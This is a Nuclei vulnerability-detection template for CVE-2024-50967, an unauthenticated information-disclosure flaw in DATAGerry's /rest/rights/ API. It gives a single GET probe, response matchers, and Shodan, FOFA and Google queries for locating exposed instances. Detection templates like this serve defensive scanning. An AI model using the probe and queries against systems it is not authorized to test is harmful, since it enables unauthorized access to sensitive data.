id: CVE-2024-50967

info:
  name: DATAGERRY - Improper Access Control
  author: s4e-io,0xByteHunter
  severity: high
  description: |
    The /rest/rights/ REST API endpoint in Becon DATAGerry through 2.2.0 contains an Incorrect Access Control vulnerability. An attacker can remotely access this endpoint without authentication, leading to unauthorized disclosure of sensitive information.
  reference:
    - https://medium.com/@0xbytehunter/my-first-cve-discovery-of-broken-access-control-in-the-datagerry-platform-7b0404f88a43
    - https://github.com/0xByteHunter/CVE-2024-50967
    - https://nvd.nist.gov/vuln/detail/CVE-2024-50967
  classification:
    cve-id: CVE-2024-50967
    cwe-id: CWE-200
    epss-score: 0.37152
    epss-percentile: 0.9704
  metadata:
    verified: true
    max-request: 1
    vendor: becon
    product: datagerry
    shodan-query: http.title:"datagerry"
    fofa-query: title="datagerry"
    google-query: intitle:"datagerry"
  tags: cve,cve2024,datagerry,auth-bypass,vkev

http:
  - method: GET
    path:
      - "{{BaseURL}}/rest/rights/"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"response_type":'
          - '"model":'
          - '"time":'
        condition: and

      - type: word
        part: content_type
        words:
          - "application/json"

      - type: status
        status:
          - 200
# digest: 490a0046304402206bf7c7ea7c8937636a5a7ee6dc06023c0aee880dbe619f59ce3b9eb1353dcf9f022035b2dc44414c85f59f4031ba337c3e433e29dd3f5a4aba018c2b7adf8c82e6e5:922c64590222798bb761d5b6d8e72950